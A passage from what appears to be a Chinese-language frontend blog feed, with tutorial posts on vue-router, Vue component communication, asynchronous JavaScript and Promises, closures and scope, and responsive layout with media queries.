id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h2><p>1、什么是路由</p><p>根据路径选择不同的页面展示给用户（所有东西都是页面，也可以说是一个个组件，用路由在之间来回切换）</p><p>2、为什么使用路由</p><p>一般来说，每次请求一个地址都会发送给服务器进行处理，但是有些用户操作不需要请求服务器，直接在页面下修改逻辑就能达到目的，这种时候用路由就可以了。</p><p>3、前端路由是什么？如何实现</p><p>前端路由是找到与地址相匹配的组件并将它渲染出来，本质是：改变浏览器地址（更新视图）但不向服务器发出请求，有两种方法可以做到：</p><ul><li>hash模式 利用URL中的hash（“#”）</li><li>history模式 利用 history.pushState API 来完成URL跳转而无须重新加载页面</li></ul><p>4、vue-router实现步骤</p><p><1> 在首页中添加两个script标签导入vue和vue-router<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/vue-router.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 用 router-link 组件来导航、传入 to 属性来指定链接、&lt;router-link&gt; 默认会被渲染成一个 a 标签 --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/&quot;&gt;Go to home&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/topic&quot;&gt;Go to topic&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/content&quot;&gt;Go to content&lt;/router-link&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 路由出口，路由匹配到的组件将在这里被渲染出来 --&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></1></p><p><2> 定义vue组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const home = &#123; template: &apos;&lt;div&gt;this is home page&lt;/div&gt;&apos; &#125;</span><br><span class="line">const topic = &#123; template: &apos;&lt;div&gt;this is topic page&lt;/div&gt;&apos; &#125;</span><br><span class="line">const content = &#123; template: &apos;&lt;div&gt;this is content page&lt;/div&gt;&apos; &#125;</span><br></pre></td></tr></table></figure></2></p><p><3> 定义路由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const routes = [</span><br><span class="line">  &#123; path:&apos;/&apos;, component: home&#125;,</span><br><span class="line">  &#123; path:&apos;/topic&apos;, component: topic&#125;,</span><br><span class="line">  &#123; path:&apos;/content&apos;, component: content&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></3></p><p><4> 创建router实例，并将定义的路由传入 const router = new VueRouter({ routes: routes })</4></p><p><5> 创建和挂载根实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const app = new Vue(&#123;</span><br><span class="line">  router: router</span><br><span class="line">&#125;).$mount(&apos;#app&apos;)</span><br></pre></td></tr></table></figure></5></p>]]></content>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vue组件通信</title>
      <link href="/2018/08/11/Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
      <url>/2018/08/11/Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>父子、兄弟组件间传值方式<br><a id="more"></a></p><h2 id="父组件传数据给子组件"><a href="#父组件传数据给子组件" class="headerlink" title="父组件传数据给子组件"></a>父组件传数据给子组件</h2><p>父组件向下传递属性给子组件，子组件通过props接收并绑定该属性<br><img src="https://i.loli.net/2018/08/11/5b6edbdfc3e85.png" alt="父传子]"></p><h2 id="子组件发事件给爸爸"><a href="#子组件发事件给爸爸" class="headerlink" title="子组件发事件给爸爸"></a>子组件发事件给爸爸</h2><p>子组件通过$emit向上发出事件，爸爸监听该事件并定义相关方法<br><img src="https://i.loli.net/2018/08/11/5b6edbec1c6c8.png" alt="子发事件]"></p><h2 id="兄弟间组件传值"><a href="#兄弟间组件传值" class="headerlink" title="兄弟间组件传值"></a>兄弟间组件传值</h2><p>1、创建一个事件总线，demo中的eventBus作为通信桥梁<br>2、在需要传值的组件中用bus.$emit(‘xxx’)触发一个自定义事件，并传递参数<br>3、在需要接收数据的组件中用bus.$on(‘xxx’, xxx-data =&gt; {})监听自定义事件，并在回调函数中处理传递过来的参数</p><p>完成下面需求：做一个点击事件，点击组件a的click，组件b中得到a的信息，即同级元素之间互相传值<br><img src="https://i.loli.net/2018/08/13/5b70f45ba71ec.png" alt="兄弟间传值]"></p>]]></content>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>异步编程的方式</title>
      <link href="/2018/08/10/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>/2018/08/10/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Promise的用法<br><a id="more"></a></p><h1 id="异步编程的四种方式"><a href="#异步编程的四种方式" class="headerlink" title="异步编程的四种方式"></a>异步编程的四种方式</h1><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>获取异步任务的结果。假设有两个函数f1和f2，f2需要等待f1的执行结果，如果f1是一个需要很长时间来执行的代码，则需要考虑改写f1，将f2作为f1的回调函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function f1(callback)&#123;</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        // f1的任务代码</span><br><span class="line">        callback();</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f1(f2)  // 执行代码会变成这样</span><br></pre></td></tr></table></figure></p><p>采用回调函数的方式，将同步操作变成异步，f1不会阻塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行</p><p>它的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合，流程会很混乱，而且每个任务只能指定一个回调函数。</p><h2 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h2><p>任务执行不取决于代码的顺序，而是事件是否发生（采用jQuery的写法）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1.on(&apos;done&apos;, f2);  // 当f1发生done事件，就执行f2</span><br></pre></td></tr></table></figure></p><p>再改写f1中的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f1()&#123;</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        // f1任务代码</span><br><span class="line">        f1.trigger(&apos;done&apos;)  // 执行完成后，立即触发done事件，从而开始执行f2</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>它的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以解耦，有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</p><h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2><p>又称为观察者模式，将上面的事件理解成信号，假设有个信号中心，某个任务执行完就向中心发布一个信号，其他依赖于这个任务的可以向信号中心订阅这个信号，从而知道什么时间自己开始执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jQuery.subscribe(&quot;done&quot;, f2);  // f2向信号中心jQuery订阅done信号</span><br></pre></td></tr></table></figure></p><p>接着对f1进行改写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f1()&#123;</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        // f1的任务代码</span><br><span class="line">        jQuery.publish(&quot;done&quot;);  // f1执行完后，向信号中心发送done信号，从而触发f2执行</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>与事件监听性质十分类似，但优于前者，我们可以通过信号中心查看设置了多少个信号，以及每个信号有多少个订阅者，从而监控程序运行</p><h2 id="Promise对象"><a href="#Promise对象" class="headerlink" title="Promise对象"></a>Promise对象</h2><p>定义：（参考阮一峰教程）</p><p>Promise 是一个对象，对象里存储一个状态，这个状态是可以随着内部的执行转化的，为以下三种状态之一：等待态(Pending)、完成态(Fulfilled)、拒绝态(Rejected)。</p><p>一开始，我们先设置好等状态从 pending 变成 fulfilled 和 rejected 的预案（当成功后我们做什么，失败时我们做什么）。</p><p>Promise 启动之后，当满足成功的条件时我们让状态从 pending 变成 fullfilled （执行 resolve）；当满足失败的条件，我们让状态从 pending 变成 rejected（执行 reject）</p><p>promise是回调的一种形式，同时也是一个事务管理器。他的作用是将各种内嵌回调的事务用流水形式表达，其目的是为了简化编程，让代码逻辑更加清晰。</p><h3 id="1、then的链式用法（结合jQuery的写法）"><a href="#1、then的链式用法（结合jQuery的写法）" class="headerlink" title="1、then的链式用法（结合jQuery的写法）"></a>1、then的链式用法（结合jQuery的写法）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url:&apos;/xxx&apos;,</span><br><span class="line">&#125;).then(successFn,errorFn).then(successFn2,errorFn2)</span><br></pre></td></tr></table></figure><h3 id="2、自己生成一个Promise对象"><a href="#2、自己生成一个Promise对象" class="headerlink" title="2、自己生成一个Promise对象"></a>2、自己生成一个Promise对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    return new Promise(function(resolve, reject)&#123;</span><br><span class="line">        setTimeout(()=&gt;&#123;</span><br><span class="line">            resolve()  // 成功后调用</span><br><span class="line">            reject()  // 失败后调用</span><br><span class="line">        &#125;, 5000)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">returnPromise().then(result)</span><br></pre></td></tr></table></figure><h3 id="3、async和await（两者的关系是相互依赖，通过await模拟同步代码）"><a href="#3、async和await（两者的关系是相互依赖，通过await模拟同步代码）" class="headerlink" title="3、async和await（两者的关系是相互依赖，通过await模拟同步代码）"></a>3、async和await（两者的关系是相互依赖，通过await模拟同步代码）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var result = await returnPromise()  //await的用法就是将异步代码写成同步的，await左边是同步，右边是异步结果，有了await它会等待异步的结果，从而改变整个代码的执行顺序，await后接一个返回promise的函数</span><br></pre></td></tr></table></figure><h3 id="4、try…catch"><a href="#4、try…catch" class="headerlink" title="4、try…catch"></a>4、try…catch</h3><p>捕获报错信息，catch是一个没有成功函数的失败函数，可以想象成then的语法糖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">  var promise = await xxx()</span><br><span class="line">  console.log(&apos;没出错&apos;)</span><br><span class="line">&#125;catch(error)&#123;</span><br><span class="line">  console.log(&apos;异常了&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> 异步 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>你不知道的JS——闭包再理解</title>
      <link href="/2018/08/05/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E2%80%94%E2%80%94%E9%97%AD%E5%8C%85%E5%86%8D%E7%90%86%E8%A7%A3/"/>
      <url>/2018/08/05/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E2%80%94%E2%80%94%E9%97%AD%E5%8C%85%E5%86%8D%E7%90%86%E8%A7%A3/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>你不知道的Javascript上卷中再次回顾闭包的概念<br><a id="more"></a><br>当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数当前是在词法作用域之外执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">    var a = 2;</span><br><span class="line">    function bar()&#123;</span><br><span class="line">        console.log(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var baz = foo();</span><br><span class="line">baz();  // 2  这就是闭包的效果</span><br></pre></td></tr></table></figure><p>函数bar的词法作用域能够访问foo的内部作用域，然后将bar函数本身当作一个值类型传递，在上面代码中，我们将bar所引用的函数对象本身当作返回值。</p><p>在foo()执行后，其返回值（也就是内部的bar函数）赋值给变量baz并调用baz()，实质上只是通过不同的标识符引用调用了内部的函数bar()</p><p>在foo()执行后通常会认为它的整个内部作用域会被销毁，因为JS引擎有垃圾回收释放内存的机制。然而，闭包的神奇之处就在于可以阻止作用域被销毁，因为bar函数仍在使用这个内部作用域，这个引用就叫闭包。</p><p>总结：</p><ul><li>函数在定义时的词法作用域之外的地方被调用，而闭包使得函数可以继续访问定义时的词法作用域</li><li>只要是对函数类型的值进行传递，在函数被调用的时候，都可以看到闭包的身影</li></ul><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h3 id="setTimeout延时函数"><a href="#setTimeout延时函数" class="headerlink" title="setTimeout延时函数"></a>setTimeout延时函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function wait(message)&#123;</span><br><span class="line">    setTimeout(function timer()&#123;</span><br><span class="line">        console.log(message);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait(&quot;Hello, closure!&quot;);</span><br></pre></td></tr></table></figure><p>将一个内部函数timer传递给setTimeout()，timer函数具有涵盖wait函数作用域的闭包，所以在函数外部，仍可以保有对message变量的引用</p><h3 id="for循环和闭包"><a href="#for循环和闭包" class="headerlink" title="for循环和闭包"></a>for循环和闭包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    setTimeout(function timer()&#123;</span><br><span class="line">        console.log(i);</span><br><span class="line">    &#125;, i*1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对这段代码的预期是分别输出数字1～5，每秒一次，每次一个。当执行后发现，实际输出的效果是每秒一次的频率输出了5个6</p><p>输出6的原因是，这段代码的循环终止条件是i不再&lt;=5，这时i首次成立的条件是i=6，而for循环中声明的i变量是全局变量，当打印事件发生的时候，i已经完成了赋值操作，即i=6，所以控制台打印的结果总是6</p><p>这里没有达到我们预期效果的原因在于，我们试图假设循环中每次迭代在运行时都会给自己捕获一个i的副本，但根据作用域的工作原理，虽然循环中的五个函数是在各个迭代中分别定义的，但它们都被封闭在一个共享的全局作用域中，因此实际上只有一个i</p><p>在循环的过程中每个迭代都需要一个闭包作用域，下面有两种解决办法：</p><ul><li>创建一个变量用来在每次迭代中储存i的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        var j = i;</span><br><span class="line">        setTimeout(function timer()&#123;</span><br><span class="line">            console.log(j);</span><br><span class="line">        &#125;, j*1000);</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>用立即执行函数，创造一个函数作用域。在每次i值改变的时候，都把i的值保存给内部函数作用域的变量j，因为立即执行函数跟i赋值的时候可以说是同步执行的，然后控制台的时候，就会拿到函数作用域中的i。</p><ul><li>let声明可以劫持块作用域，并在这个块作用域中声明一个变量<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(let i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    setTimeout(function timer()&#123;</span><br><span class="line">        console.log(i);</span><br><span class="line">    &#125;, i*1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>将let声明在for循环头部同样可以解决问题，它还有一个特殊的行为，这个行为指出变量在循环过程中不止被声明一次，每次迭代都会声明，随后的每个迭代都会使用上一个迭代结束时的值来初始化这个变量。</p>]]></content>
      
      
        <tags>
            
            <tag> 闭包 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>作用域及闭包</title>
      <link href="/2018/08/05/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%8F%8A%E9%97%AD%E5%8C%85/"/>
      <url>/2018/08/05/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%8F%8A%E9%97%AD%E5%8C%85/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>执行上下文环境到作用域再到闭包<br><a id="more"></a></p><h2 id="执行上下文环境"><a href="#执行上下文环境" class="headerlink" title="执行上下文环境"></a>执行上下文环境</h2><hr><p>说到作用域，首先理解一下执行上下文环境（在执行代码之前，把要用到的变量先取出来，有的直接赋值，有的用undefined占位）</p><ul><li><p>对于普通变量和函数表达式，声明并默认赋值 undefined</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = 1  //var a 提升，默认值为undefined</span><br><span class="line">var fn = function()&#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于函数声明，会赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function fn()&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><hr><p>什么是作用域：</p><p>作用域是你的代码在运行时，各个变量、函数和对象的可访问性。换句话说，作用域决定了你的代码里的变量和其他资源在各个区域中的可见性。</p><p>为什么需要作用域？最小访问原则</p><p>那么，限制变量的可见性，不允许你代码中所有的东西在任意地方都可用的好处是什么？其中一个优势，是作用域为你的代码提供了一个安全层级。计算机安全中，有个常规的原则是：用户只能访问他们当前需要的东西。</p><p>下面来看一下具体的作用域的问题，可以将作用域抽象的理解为一块地盘，当中没有变量的概念，需要通过作用域对应的执行上下文环境来获取变量的值，所以作用域中变量的值是在执行过程中产生和确定的，而作用域是在函数创建时就确定了。还要记住一点：除了全局作用域，只有函数才能创建作用域</p><p><img src="https://i.loli.net/2018/07/03/5b3b8ea1485aa.png" alt="作用域.png"></p><ul><li>第一步，加载程序时就确定了全局上下文环境，每个函数也都会创建自己的作用域，函数的作用域在创建时就已经确定，而不是在调用的时候</li><li>第二步，执行到最后一行调用函数fn(10)，此时生成fn函数的上下文环境，并将它设置成活跃状态</li><li>第三步，执行到调用bar(100)，此时生成bar函数的上下文环境，并将它设置成活跃状态</li><li>第四步，调用完bar(100)，它的上下文环境被销毁，接着调用bar(200)，生成它的上下文环境，并设置成活跃状态</li><li>第五步，bar(200)调用结束，它的上下文环境被销毁，此时又会回到fn(10)的上下文环境，并将它设置成活跃状态</li><li>第六步，执行完fn(10)，它的上下文环境销毁，此时又回到全局上下文环境的活跃状态</li></ul><p>作用域链：当你需要用到一个变量时，在哪个作用域中取得这个变量，这是一个由内而外的查找过程，一层一层直到全局作用域为止，需要注意的是，要到创建这个函数的作用域中取值而不是调用函数的时候</p><h3 id="作用域和执行上下文环境的关系"><a href="#作用域和执行上下文环境的关系" class="headerlink" title="作用域和执行上下文环境的关系"></a>作用域和执行上下文环境的关系</h3><p>作用域指的是变量的可见性，上下文指的是在相同作用域中this的值，我们可以使用函数方法改变上下文，在全局作用域中，上下文总是Window对象。一个作用域下可能包含了若干的上下文环境；有可能没有过上下文环境（函数始终没有被调用）；有可能有过，但在函数被调用完之后，上下文环境被销毁；有可能存在一个或多个（即闭包）</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><hr><p>闭包的概念与词法作用域紧密相关，当内部函数试着访问外部函数的作用域链（词法作用域之外的变量）时产生闭包，闭包包括了它们自己的作用域链、父级作用域链和全局作用域链</p><p>结合上面对作用域的理解，闭包的一个核心内容是：当函数调用完之后，它的执行上下文环境不会接着被销毁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var func = function()&#123;</span><br><span class="line">    var a = &apos;jayce&apos;;</span><br><span class="line">    var fn1 = function()&#123;</span><br><span class="line">        a += &apos; xi&apos;;</span><br><span class="line">        console.log(a);</span><br><span class="line">    &#125;</span><br><span class="line">    return fn1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var fn2 = func();</span><br><span class="line">fn2();  // jayce xi</span><br><span class="line">fn2();  // jayce xi xi</span><br></pre></td></tr></table></figure></p><p>当你第一次调用完fn2之后，func中的变量a变成’jayce xi’，而没有被销毁，fn1就形成了一个闭包，变量a的生命也因此得以延续。闭包有三个特点：</p><ul><li>它是一个函数，比如上面例子中的fn1</li><li>函数中使用了其他作用域中的变量，使得变量不会被销毁，如上面的fn1调用了它上级作用域func中的变量a</li><li>闭包存在在定义该变量的作用域中，上面的变量a存在于func函数的局部作用域中，fn1也存在于此</li></ul><p>闭包是什么：函数、函数内部可以访问到的变量的总和（也叫环境），就是一个闭包。函数内部返回了一个函数，而函数一个很重要的特点在于可以创建一个独立作用域，当这个要返回的函数体中，需要引用一个变量，这个变量存在于它的上级函数的作用域中，那么这个变量所在的上级函数的上下文环境就不能被销毁，否则就不能获取这个变量了。（访问上级作用域中的变量的权限）</p><p>闭包解决了什么：因为闭包可以访问上级作用域，从而打破因作用域引起的函数外部不能访问另一个函数内部变量的束缚，就拿ajax的成功回调来说，这里就是一个闭包的概念，回调函数拥有了访问和操作上级作用域的能力，带来了极大的便利。</p><p>闭包的应用场景：ajax请求的成功回调、setTimeout延时回调、一个函数内部返回一个匿名函数、事件上绑定的回调方法，不管是哪种方式，只要是对函数类型的值进行传递，当函数在别处被调用时都是闭包的一个具体表现</p><p>作用：</p><ul><li>隐藏变量，但通过返回一个函数使得外部可以访问这个变量</li><li>封装对象的私有属性和方法</li></ul>]]></content>
      
      
        <tags>
            
            <tag> 作用域 闭包 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>响应式布局及动态rem</title>
      <link href="/2018/08/03/%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80%E5%8F%8A%E5%8A%A8%E6%80%81rem/"/>
      <url>/2018/08/03/%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80%E5%8F%8A%E5%8A%A8%E6%80%81rem/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>移动端适配及动态rem方案<br><a id="more"></a></p><h2 id="使用meta标签"><a href="#使用meta标签" class="headerlink" title="使用meta标签"></a>使用meta标签</h2><hr><p>在做移动端页面时，要使用meta标签，它用来控制页面在移动端不要缩放，如果没有指定，将会默认为980px，它指定了以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1, minimum-scale=1&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>芳芳老师曾经给过一个答案，它的作用是这样来的：一开始的页面都是为PC端准备的，在乔布斯推出了iPhone3GS手机后，PC端的页面不能适应手机屏幕的大小，所以苹果工程师想出了一个办法，默认将手机模拟成980px，使得页面缩小可以适应手机屏幕，后来智能手机普及，这个功能部分网站不再需要，所以就用meta:vp来控制手机页面不要缩放。</p><h2 id="media媒体查询功能"><a href="#media媒体查询功能" class="headerlink" title="@media媒体查询功能"></a>@media媒体查询功能</h2><hr><p>有两种方式加入媒体查询</p><ul><li><p>在style标签中直接插入 @media 后接查询条件，如果满足条件，里面的CSS代码就生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @media(min-width: 320px) and (max-width: 375px)&#123;  //在设备最小宽度为320px，最大宽度375px时body的背景颜色才会被改变</span><br><span class="line">    body&#123;</span><br><span class="line">        background: pink;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li><li><p>在link标签中引用media</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;(max-width: 320px)&quot;&gt;  //在最大宽度为320px时，才会执行style.css文件</span><br></pre></td></tr></table></figure></li></ul><p>这里有一点要注意，虽然css代码是有条件的执行，但是css文件总是会被下载，只是看是否生效</p><h3 id="用很多套css样式来匹配不同的设备宽度"><a href="#用很多套css样式来匹配不同的设备宽度" class="headerlink" title="用很多套css样式来匹配不同的设备宽度"></a>用很多套css样式来匹配不同的设备宽度</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span 